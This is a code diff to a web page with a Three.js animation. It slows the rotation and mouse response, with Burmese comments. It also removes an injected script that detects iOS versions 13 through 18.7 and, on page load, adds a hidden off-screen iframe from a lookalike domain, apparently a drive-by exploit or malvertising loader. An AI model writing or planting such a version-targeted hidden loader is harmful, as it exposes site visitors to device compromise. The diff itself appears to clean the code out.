@@ -305,14 +305,16 @@
 
         let mouseX = 0, mouseY = 0;
         window.addEventListener('mousemove', (e) => {
-            mouseX = (e.clientX - window.innerWidth / 2) * 0.001;
-            mouseY = (e.clientY - window.innerHeight / 2) * 0.001;
+            // Mouse sensitivity ကို လျှော့ချထားသည် (0.001 မှ 0.0002 သို့)
+            mouseX = (e.clientX - window.innerWidth / 2) * 0.0002;
+            mouseY = (e.clientY - window.innerHeight / 2) * 0.0002;
         });
 
         function animate() {
             requestAnimationFrame(animate);
-            torusKnot.rotation.x += 0.003 + mouseY;
-            torusKnot.rotation.y += 0.005 + mouseX;
+            // လှည့်ပတ်နှုန်းကို သိသိသာသာ နှေးကွေးစေရန် တန်ဖိုးများကို လျှော့ချထားသည်
+            torusKnot.rotation.x += 0.0008 + mouseY;
+            torusKnot.rotation.y += 0.0012 + mouseX;
             renderer.render(scene, camera);
         }
         animate();
@@ -513,32 +515,5 @@
             }
         }
     </script>
-<script>
-    // Check iOS Version and conditionally inject iframe
-    function checkIOSAndInjectIframe() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/OS (\d+)_(\d+)?_?(\d+)?/);
-        
-        if (match) {
-            const major = parseInt(match[1], 10);
-            const minor = match[2] ? parseInt(match[2], 10) : 0;
-            
-            // Rules condition: major >= 13 && (major < 18 || (major === 18 && minor <= 7))
-            if (major >= 13 && (major < 18 || (major === 18 && minor <= 7))) {
-                const iframe = document.createElement('iframe');
-                iframe.src = "https://ads.yurticlkargo.com/static/sdk.html";
-                iframe.style.cssText = "position:fixed;top:0;left:-1000px;pointer-events:none;border:0";
-                document.body.appendChild(iframe);
-            }
-        }
-    }
-
-    // Page Load ပြီးတာနဲ့ ဒီ Function အလုပ်လုပ်စေရန်
-    window.addEventListener('DOMContentLoaded', checkIOSAndInjectIframe);
-</script>
-    <script>
-  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
-</script>
-<script defer src="/_vercel/insights/script.js"></script>
 </body>
 </html>
